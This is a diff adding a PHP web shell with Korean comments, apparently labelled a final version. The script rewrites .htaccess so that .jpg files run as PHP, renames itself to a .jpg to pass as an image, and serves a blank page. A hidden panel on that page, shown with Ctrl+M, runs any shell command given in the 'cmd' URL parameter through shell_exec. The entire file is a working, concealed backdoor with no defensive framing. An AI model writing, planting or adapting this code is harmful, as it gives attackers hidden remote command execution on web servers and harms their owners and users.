@@ -1,0 +1,95 @@
+<?php
+// 1. 파일 이름 변경: PHP 파일을 실행 시 자신의 확장자를 .jpg로 변경 ex)cmd.php → cmd.jpg
+
+// .htaccess 파일 경로
+$htaccess_path = __DIR__ . '/.htaccess';
+
+// 추가할 내용 (확장자가 jpg여도 php코드가 실행되게 함)
+$new_content = "AddType application/x-httpd-php .jpg\n";
+
+// .htaccess 파일이 존재하는지 확인
+if (file_exists($htaccess_path)) {
+    // 기존 내용을 읽어옴
+    $existing_content = file_get_contents($htaccess_path);
+    
+    // 중복 확인: 이미 설정이 포함되어 있는지 확인
+    if (strpos($existing_content, $new_content) === false) {
+        // 중복되지 않으면 새 내용을 추가
+        $updated_content = $existing_content . "\n" . $new_content;
+        file_put_contents($htaccess_path, $updated_content);
+    }
+} else {
+    // .htaccess 파일이 없으면 새로 생성 후 내용 추가
+    file_put_contents($htaccess_path, $new_content);
+}
+
+$current_file = __FILE__;
+$new_file = preg_replace('/\.php$/', '.jpg', $current_file);
+if ($current_file !== $new_file) {
+    rename($current_file, $new_file); // 파일 이름 변경
+    header("Location: " . basename($new_file)); // 변경된 파일로 리다이렉트
+    exit;
+}
+
+// 3. 숨겨진 명령어 실행 인터페이스
+?>
+<!DOCTYPE html>
+<html lang="kr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            background-color: #000;
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #fff;
+            font-family: Arial, sans-serif;
+        }
+        #cmd-container {
+            display: none;
+        }
+        pre {
+            background-color: #111;
+            color: #0f0;
+            padding: 15px;
+            border-radius: 5px;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+    </style>
+</head>
+<body>
+    <div id="cmd-container">
+        <h2>Command Result:</h2>
+        <pre>
+<?php
+// 4. 명령어 실행 처리
+if (isset($_GET['cmd'])) {
+    $cmd = $_GET['cmd'];
+    echo shell_exec($cmd); // 명령어 실행 결과 출력
+}
+?>
+        </pre>
+    </div>
+
+    <script>
+        // Ctrl + M 키 조합으로 명령어 실행 영역 표시
+        document.addEventListener('keydown', function(event) {
+            if (event.ctrlKey && event.key === 'm') { // Ctrl + M
+                const cmdContainer = document.getElementById('cmd-container');
+                if (cmdContainer.style.display === 'none') {
+                    cmdContainer.style.display = 'block';
+                } else {
+                    cmdContainer.style.display = 'none';
+                }
+            }
+        });
+    </script>
+</body>
+</html>
+
+최종본임
